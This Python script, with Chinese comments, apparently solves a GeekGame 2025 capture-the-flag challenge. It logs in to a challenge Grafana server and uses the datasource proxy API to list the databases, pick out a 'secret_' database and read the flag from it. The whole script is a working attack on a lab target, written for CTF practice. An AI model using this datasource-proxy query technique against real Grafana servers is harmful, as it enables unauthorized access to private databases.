import requests

# 脚本思路来自 GeekGame 2025 Grafana 题，通过 API 查询数据库中的 flag

HOST="https://prob04-ckfjxhuv.geekgame.pku.edu.cn/"

# 打印登陆用户的 uid
ds_uid = requests.get(
    f'{HOST}/api/datasources',
    auth=('geekgame', 'geekgame'),
).json()[0]['uid']

print(ds_uid)

# 打印可疑的数据库名
res = requests.post(
    f'{HOST}/api/datasources/proxy/uid/{ds_uid}/query',
    auth=('geekgame', 'geekgame'),
    data={
        'q': 'show databases',
    },
).json()
for v in res['results'][0]['series'][0]['values']:
    if v[0].startswith('secret_'):
        db_name = v[0]
        break
print(db_name)

# COOKIE需要从浏览器中获取，好像不需要 COOKIE 也可以
# COOKIES="anticheat_canary=ocfkdnvqci; grafana_session=fc52e796b54a8bc4b3b6b41e46b6bd41; grafana_session_expiry=1761531727"

res = requests.post(
    f'{HOST}/api/datasources/proxy/uid/{ds_uid}/query',
    auth=('geekgame', 'geekgame'),
    # cookies=COOKIES,
    data={
        'q': f'select value from {db_name}..flag1',
    },
).json()
flag = res['results'][0]['series'][0]['values'][0][1]

print(flag)